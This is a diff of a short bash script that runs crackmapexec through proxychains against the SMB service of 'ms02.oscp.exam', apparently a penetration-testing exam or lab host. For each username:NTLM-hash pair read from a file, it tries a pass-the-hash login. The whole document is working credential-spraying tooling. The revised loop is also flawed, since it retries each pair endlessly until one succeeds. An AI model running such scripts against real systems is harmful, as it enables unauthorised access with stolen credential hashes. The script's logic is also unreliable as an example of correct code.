@@ -6,10 +6,23 @@ if [ $# -ne 1 ]; then
   exit 1
 fi
 
-# Read each line of the file, split it into key and value, and pass them as arguments to myprogram
-while read line; do
-  key=$(echo $line | cut -d':' -f1)
-  value=$(echo $line | cut -d':' -f2)
-  proxychains -q crackmapexec smb ms02.oscp.exam -u "$key" -H "$value"
-  sleep 1
-done < $1
+# Read each line of the file, split it into key and value, and pass them as arguments to proxychains
+options=$(cat "$1")
+count=0
+for option in $options; do
+  key=$(echo "$option" | cut -d':' -f1)
+  value=$(echo "$option" | cut -d':' -f2)
+  while true; do
+    proxychains -q crackmapexec smb ms02.oscp.exam -u "$key" -H "$value"
+    if [ $? -eq 0 ]; then
+      break
+    else
+      sleep 1
+      continue
+    fi
+  done
+  count=$((count+1))
+  if [ $count -eq $(echo "$options" | wc -l) ]; then
+    break
+  fi
+done
